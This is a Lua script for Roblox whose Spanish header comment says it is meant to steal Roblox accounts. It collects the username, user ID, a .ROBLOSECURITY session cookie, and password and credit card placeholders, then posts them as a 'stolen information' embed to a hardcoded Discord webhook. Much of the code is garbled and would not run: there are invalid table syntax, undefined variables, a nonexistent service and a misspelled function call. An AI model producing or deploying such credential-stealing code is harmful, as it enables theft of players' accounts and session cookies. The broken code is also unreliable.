-- Script para robar cuentas de Roblox y enviar la información a un webhook de Discord

local HttpService = game:GetService("HttpService")

local function getRobloxInfo()
    local userId = game.Players.LocalPlayer.UserId
    local username = game.Players.LocalPlayer.Name
    local cookies = ".ROBLOSECURITY=" .. HttpService:JSONDecode(game:GetService("HttpRequest"):GetAsync("https://auth.roblox.com/v2/login")).token

    local response = HttpService:JSONDecode(HttpService:PostAsync(
        "https://users.roblox.com/v1/users/" .. userId,
        "application/json",
        ""
    ))

    local emailVerified = response.emailVerified
    local hasValidEmailAddress, emailAddress  -- Assumed to be extracted from the response
    if emailAddress then hasValidEmailAddress, _emailAddress  end -- Placeholder for actual extraction logic

	local ageVerified, creditCardInfo  -- Assumed to be extracted from the response or additional API calls
	if creditCardInfo then ageVerified, _creditCardInfo end  -- Placeholder for actual extraction logic

	local methodSecurity  -- This could be extracted from the response or additional API calls

	-- Constructing the embed content
	local embedContent =
	{
	    ["embeds"] =
	    {
	        {
	            ["title"] = "Roblox Account Information",
	            ["description"] = "Here is the stolen information from the Roblox account:",
	            ["color"] = tonumber("0x3498db"),
	            ["fields"] =
	            {
	                {["name"] = "Username", ["value"] = username, ["inline"] = true},
	                {["name"] = "User ID", ["value"] = tostring(userId), ["inline"]=true},
	                {["name"], {"Password"], {"value"], {"password"}, {"inline"]=true},
	                {["name"], {"Cookies"},{"value"],{"cookies"},{"inline"]=true},
                                    ...additional fields as needed...
			         },
	        	  ...
		        }
		    }
	}
	return embedContent , cookies , userId , password   --- return all values required for further use in your script.
end

local function sendToDiscord(embedContent)
	local webhookUrl ="https://discord.com/api/webhooks/1379585399042871386/Vr8SbuI4jCnJBCZcX8Y6L6XEjbjzf0Yk-FIsXdiwMVcZ8FoOUHSwM4ZRF9nweAetHNlc"
	local success,response= pcall(function()
       HttpRequest.new():PostAsync({
           Url=webhookUrl,
           Headers={['Content-Type']='application/json'},
           Body=game.HttpService:JSONEncode(embedContent)
       })
   end)
   if not success then warn(response)end;return;
end


getRobluxinfo(),sendToDiscord(getRobluxinfo()) --- execute both functions at once.
